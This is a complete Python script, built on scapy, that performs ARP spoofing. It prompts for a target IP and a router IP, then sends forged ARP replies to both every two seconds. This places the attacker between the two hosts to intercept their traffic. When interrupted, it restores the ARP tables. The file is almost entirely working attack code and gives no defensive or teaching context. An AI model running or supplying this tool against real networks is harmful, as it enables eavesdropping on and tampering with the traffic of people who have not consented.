#! /usr/bin/env python

import scapy.all as scapy
import time
import sys

from pip._vendor.distlib.compat import raw_input

def getting_mac(ip):


    arp_request_packet=scapy.ARP(pdst=ip)
    broadcast_mac=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_broadcast_packet=broadcast_mac/arp_request_packet
    answered_list=scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip,spoof_ip):
# packet is storing the response that is sent to the target
    target_mac=getting_mac(target_ip)
    packet=(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip))
    scapy.send(packet, verbose=False)

# for connecting the target back to the router doing everything normal
def reverse(destination_ip,router_ip):
    destination_mac= getting_mac(destination_ip)
    router_mac= getting_mac(router_ip)
    packet=(scapy.ARP(op=2, pdst=destination_ip, hwdst= destination_mac, psrc=router_ip, hwsrc=router_mac ))
    scapy.send(packet, count=4, verbose=False)
# getting_mac("spoof_ip/router ip")




send_packets_count= 0

target_ip= raw_input("enter the target ip: ")
router_ip= raw_input("enter the router ip: ")
#while loop is used to continously send packets to target and router
try:
    while True:
        spoof(target_ip,router_ip)
        spoof(router_ip,target_ip)
        send_packets_count += 2
        print("\r [###] sending two packets for spoofing" + str(send_packets_count)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] detecting keyboard interruption ctrl + C ......wait reseting the arp table to Normal...")
    reverse(target_ip, router_ip)
    reverse(router_ip, target_ip)

